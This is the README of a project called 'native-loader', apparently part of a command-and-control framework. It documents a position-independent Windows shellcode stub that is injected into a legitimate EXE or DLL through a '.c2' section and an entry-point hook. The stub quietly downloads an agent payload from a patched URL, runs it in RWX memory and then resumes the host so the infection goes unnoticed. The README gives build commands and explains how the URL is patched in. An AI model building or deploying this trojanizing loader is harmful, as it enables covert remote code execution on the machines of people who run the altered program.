# native-loader

Position-independent Windows loader **stub**, injected into a host PE.

The stub is a small freestanding C program compiled to flat position-independent
shellcode. Injected into a host EXE/DLL (new `.c2` section + entry-point hook), it:

1. Resolves `kernel32` and its APIs via a PEB/Ldr walk — **no imports, no CRT**.
2. Spawns a background thread that downloads the Position-Independent-Agent (PIA)
   `.bin` from a patched URL over WinINet and runs it in memory
   (`VirtualAlloc` RWX + call).
3. Resumes the host's original entry point, so the legit binary runs normally.

## Build

```sh
x86_64-w64-mingw32-gcc -c -O2 -ffreestanding -nostdlib -fno-stack-protector  -fno-asynchronous-unwind-tables -fno-unwind-tables \
  -e _start stub/stub.c -o stub.o
x86_64-w64-mingw32-ld -T stub/stub.ld --entry=_start -o stub.pe stub.o
x86_64-w64-mingw32-objcopy -O binary stub.pe stub-x64.bin
```

Requires `gcc-mingw-w64-x86-64`. CI does this automatically — see
[.github/workflows/release.yml](.github/workflows/release.yml).

> **x86 (32-bit) target**: PIC shellcode from C is straightforward on x64
> (RIP-relative addressing) but awkward on x86 (no RIP-relative). The x86 variant
> is deferred; only `stub-x64.bin` is published for now.

## Release asset contract

The rolling **`preview`** release publishes:

| Asset | Arch | Notes |
|-------|------|-------|
| `stub-x64.bin` | x86_64 | flat PIC shellcode; entry at byte 0 |

## Binder-patched fields (ASCII-findable by the shared `LoaderUrlPatcher`)

- `SHELLCODE_URL_PLACEHOLDER` — 256-byte slot; the agent URL is written here (UTF-8, zero-padded).

The stub reads the URL from the first slot and the OEP RVA from the second to resume the host (ASLR-safe — it derives the module base from PEB at runtime).